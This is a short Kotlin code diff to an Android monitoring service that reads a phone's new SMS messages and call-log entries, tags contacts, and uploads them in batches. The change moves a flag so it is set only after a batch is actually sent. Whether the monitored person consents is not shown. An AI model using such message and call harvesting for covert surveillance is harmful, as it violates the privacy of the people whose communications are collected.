@@ -2873,7 +2873,6 @@ class MonitoringService : Service() {
             }
             val smsPage = smsRepository.getNewSms(lastSms)
             if (smsPage.isNotEmpty()) {
-                found = true
                 var smsCursor = lastSms
                 var smsSentAny = false
                 val freqMap = try { batchFreqMap() } catch (_: Exception) { null }
@@ -2884,6 +2883,7 @@ class MonitoringService : Service() {
                         smsCursor = maxOf(smsCursor, part.maxOf { it.id })
                         try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                         smsSentAny = true
+                        found = true
                     } else {
                         break
                     }
@@ -2905,7 +2905,6 @@ class MonitoringService : Service() {
             }
             val callPage = callLogRepository.getNewCalls(lastCallTs, lastCallId)
             if (callPage.isNotEmpty()) {
-                found = true
                 var callSentAny = false
                 val callKnown = try { callPage.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in callPage.chunked(10)) {
@@ -2923,6 +2922,7 @@ class MonitoringService : Service() {
                     } catch (_: Exception) {
                     }
                     callSentAny = true
+                    found = true
                 }
                     if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
